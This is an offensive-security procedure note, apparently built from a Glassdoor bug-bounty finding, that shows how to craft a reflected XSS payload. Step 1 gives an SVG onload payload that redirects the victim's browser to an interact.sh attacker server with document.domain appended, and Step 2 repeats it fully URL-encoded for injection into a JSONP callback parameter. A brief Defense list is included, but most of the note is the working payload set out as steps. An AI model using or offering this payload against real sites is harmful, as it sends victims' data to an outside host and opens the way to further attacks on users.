---
tags:
  - xss
  - payload-crafting
  - svg-injection
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:49.479Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 449796ba-752a-4993-9a75-b1de47c645ff
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-and-Encode-Malicious-SVG-Payload-for-XSS

## Summary

This procedure crafts a malicious SVG-based HTML payload for reflected XSS exploitation, encoding it for URL transmission to bypass basic filters and enable JavaScript execution via onload attributes.

## Description

In the context of the Glassdoor vulnerability, the payload injects an SVG element that triggers a redirect to an attacker-controlled server upon page load, appending the victim's document.domain. This allows domain reconnaissance or further attacks. The target is web applications reflecting user input without sanitization, specifically in JSONP-style callbacks. Prerequisites include access to a URL encoder and a receiving server for exfiltration.

## Requirements

1. Burp Suite or similar proxy for encoding/decoding
2. Attacker-controlled domain for exfiltration (e.g., interact.sh)
3. Knowledge of target endpoint parameters

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization and HTML/JS encoding for reflected parameters
- Set Content-Type to application/json or text/javascript to prevent HTML parsing
- Use Content Security Policy (CSP) to block inline scripts and SVG execution
- Monitor for anomalous redirects or exfiltration requests in server logs

## Objectives

1. Create a functional XSS payload that executes in the victim's browser context
2. Encode the payload to survive URL transmission and decoding
3. Enable initial data exfiltration (e.g., domain info)

## Instructions

### Step 1: Design the Raw Payload

**Context**: Build the base HTML/SVG structure that injects and executes JavaScript without breaking the page.

No specific command; manually construct: `<!DOCTYPE html><html><svg/onload=location/**/='https://c3rqmwkyedf0000r3mr0gbhm4scyyyyyb.interact.sh/'+document.domain></html><!--`. The `/**/` comments out potential parsing issues, and SVG onload evades some filters.

> This payload declares a DOCTYPE, opens HTML/SVG, and sets location to exfiltrate the domain. Expected output: Valid HTML snippet that renders as SVG.

### Step 2: URL-Encode the Payload

**Context**: Encode special characters to make the payload suitable for the callback parameter.

Use Burp Suite's encoder: Input the raw payload and select URL encoding.

> Result: `%3C%21%44%4F%43%54%59%50%45%20%68%74%6D%6C%3E%3C%68%74%6D%6C%3E%3C%73%76%67%2F%6F%6E%6C%6F%61%64%3D%6C%6F%63%61%74%69%6F%6E%2F%2A%2A%2F%3D%27%68%74%74%70%73%3A%2F%2F%63%33%72%71%6D%77%6B%79%65%64%66%30%30%30%30%72%33%6D%72%30%67%62%68%6D%34%73%63%79%79%79%79%79%62%2E%69%6E%74%65%72%61%63%74%2E%73%68%2F%27%2B%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%3E%3C%2F%68%74%6D%6C%3E%3C%21%2D%2D`. Expected output: Encoded string verifiable by decoding back to original.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[xss]]
- [[payload-crafting]]
